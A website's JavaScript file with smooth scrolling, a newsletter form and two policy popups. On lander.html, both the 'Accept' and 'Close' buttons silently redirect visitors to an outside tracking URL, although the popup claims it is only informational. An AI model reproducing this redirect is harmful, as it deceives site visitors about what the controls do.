// Safe footer year
const yearEl = document.getElementById('current-year');
if (yearEl) yearEl.textContent = new Date().getFullYear();

// Smooth scrolling for navigation links
document.querySelectorAll('a[href^="#"]').forEach(anchor => {
  anchor.addEventListener('click', function (e) {
    const href = this.getAttribute('href');
    if (!href || href === '#') return;
    const target = document.querySelector(href);
    if (target) {
      e.preventDefault();
      target.scrollIntoView({ behavior: 'smooth', block: 'start' });
    }
  });
});

// Newsletter form handling
document.querySelector('.newsletter-form')?.addEventListener('submit', function(e) {
  e.preventDefault();
  const email = this.querySelector('input[type="email"]').value;
  if (email && isValidEmail(email)) {
    alert('Thank you for subscribing to our newsletter!');
    this.reset();
  } else {
    alert('Please enter a valid email address.');
  }
});

function isValidEmail(email) {
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return emailRegex.test(email);
}

// Add loading animation
window.addEventListener('load', function() {
  document.body.classList.add('loaded');
});

// Simple scroll effect for navbar
window.addEventListener('scroll', function() {
  const header = document.querySelector('header');
  if (!header) return;
  if (window.scrollY > 100) {
    header.style.background = 'rgba(255, 255, 255, 0.95)';
    header.style.backdropFilter = 'blur(10px)';
  } else {
    header.style.background = '#fff';
    header.style.backdropFilter = 'none';
  }
});

/* -------------------------------
   HOME PAGE POPUP (index.html)
--------------------------------*/
(function() {
  const path = window.location.pathname;
  // treat /, /folder/, and .../index.html as home
  const isHome = /(\/$|index\.html$)/.test(path);

  if (!isHome) return; // prevent this block from running on other pages

  const modalBackdrop = document.createElement('div');
  modalBackdrop.className = 'modal-backdrop';

  modalBackdrop.innerHTML = `
    <div class="modal" role="dialog" aria-modal="true" aria-labelledby="policy-title">
      <h3 id="policy-title">Policy Notice</h3>
      <p>Are you accepting our policy to play the game? This notice is informational and does not block access.</p>
      <div style="display: flex; gap: 10px; flex-wrap: wrap;">
        <button class="btn" id="age-yes">Yes, Accept</button>
        <button class="btn ghost" id="age-no">Close</button>
      </div>
    </div>
  `;

  document.body.appendChild(modalBackdrop);
  modalBackdrop.style.display = 'flex';

  function closeGate() {
    modalBackdrop.style.display = 'none';
    modalBackdrop.remove();
  }

  modalBackdrop.querySelector('#age-yes').addEventListener('click', closeGate);
  modalBackdrop.querySelector('#age-no').addEventListener('click', closeGate);
})();

/* --------------------------------
   LANDER PAGE POPUP (lander.html)
---------------------------------*/
(function() {
  const path = window.location.pathname;
  const isLander = /(\/lander\.html$)/.test(path);

  if (!isLander) return;

  const modalBackdrop = document.createElement('div');
  modalBackdrop.className = 'modal-backdrop';

  modalBackdrop.innerHTML = `
    <div class="modal" role="dialog" aria-modal="true" aria-labelledby="policy-title-lander">
      <h3 id="policy-title-lander">Policy Notice</h3>
      <p>Are you accepting our policy to play the game? This notice is informational and does not block access.</p>
      <div style="display: flex; gap: 10px; flex-wrap: wrap;">
        <button class="btn" id="age-yes-lander">Yes, Accept</button>
        <button class="btn ghost" id="age-no-lander">Close</button>
      </div>
    </div>
  `;

  document.body.appendChild(modalBackdrop);
  modalBackdrop.style.display = 'flex';

  const redirectUrl = "https://garrix.site/?utm_campaign=WYdqExpNaM&v1=[v1]&v2=[v2]&v3=[v3]";

  const go = () => { window.location.href = redirectUrl; };

  modalBackdrop.querySelector('#age-yes-lander').addEventListener('click', go);
  modalBackdrop.querySelector('#age-no-lander').addEventListener('click', go);
})();
